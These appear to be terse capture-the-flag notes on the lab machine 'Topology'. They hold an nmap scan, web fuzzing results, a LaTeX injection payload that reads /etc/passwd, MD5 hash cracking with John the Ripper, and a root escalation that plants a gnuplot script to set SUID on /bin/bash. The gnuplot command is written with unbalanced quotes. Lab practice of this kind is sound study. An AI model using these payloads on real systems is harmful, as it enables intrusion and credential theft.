### Scan
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 10:12 +0200
Nmap scan report for 10.129.48.189
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Miskatonic University | Topology Group
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds

```

### Directories and subdomains
http://latex.topology.htb/ 

```
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 22ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 28ms]
index.html              [Status: 200, Size: 6767, Words: 1612, Lines: 175, Duration: 25ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 24ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4429ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4855ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 29ms]
~bin                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms]
~lp                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 33ms]
~sys                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 23ms]
~nobody                 [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 35ms]
~mail                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 38ms]
:: Progress: [4750/4750] :: Job [1/1] :: 1408 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```


`$\lstinputlisting{/etc/passwd}$`


```
john --format=raw-md5 hash.txt -w /usr/share/wordlists/rockyou.txt
Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 51 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=10
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
emerald          (?)     
1g 0:00:00:00 DONE (2026-08-22 10:51) 50.00g/s 177300p/s 177300c/s 8922KC/s !@#$%..sss
Warning: passwords printed above might not be all those cracked
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

WRONG

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt         
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (?)     
1g 0:00:00:03 DONE (2026-08-22 10:55) 0.3144g/s 313358p/s 313358c/s 313358C/s calebd1..bztfriend
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```
/home/vdaisley                                                                                                                                                                                                                              
/opt/gnuplot
/run/lock
/run/screen
/run/screen/S-vdaisley
/run/user/1007
/run/user/1007/dbus-1
/run/user/1007/dbus-1/services
/run/user/1007/gnupg
/run/user/1007/inaccessible
/run/user/1007/pulse
/run/user/1007/pulse/pid
/run/user/1007/systemd
/run/user/1007/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas_host_checker_33748.err
/tmp/linpeas_host_checker_33748.json
/tmp/.Test-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/latex/tempfiles

```

/bin/sh /opt/gnuplot/getdata.sh 
2026/08/23 03:52:01 CMD: UID=0     PID=80012  | /bin/sh -c /opt/gnuplot/getdata.sh 

`/bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;`

`echo 'system "chmod u+s /bin/bash > exploit.plt`
-> sets suid binary of bash to root 

then: `/bin/bash -p`